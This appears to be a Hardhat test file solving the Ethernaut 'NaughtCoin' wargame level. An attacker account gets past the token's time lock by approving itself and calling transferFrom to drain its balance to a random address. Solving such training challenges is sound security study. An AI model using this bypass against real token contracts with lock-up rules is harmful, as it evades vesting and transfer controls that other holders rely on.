import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut 15 - NaughtCoin", function () {
  it("Should bypass transfer lock using transferFrom", async function () {
    const [attacker] = await ethers.getSigners();

    // Deploy NaughtCoin to attacker
    const NaughtCoinFactory = await ethers.getContractFactory("NaughtCoin");
    const token = await NaughtCoinFactory.connect(attacker).deploy(attacker.address);
    await token.waitForDeployment();

    const totalBalance = await token.balanceOf(attacker.address);
    expect(totalBalance).to.be.gt(0n);

    // Approve and transfer to a valid recipient
    await token.connect(attacker).approve(attacker.address, totalBalance);
    const recipient = ethers.Wallet.createRandom().address;

    await token.connect(attacker).transferFrom(attacker.address, recipient, totalBalance);

    const finalBalance = await token.balanceOf(attacker.address);
    expect(finalBalance).to.equal(0n);
  });
});
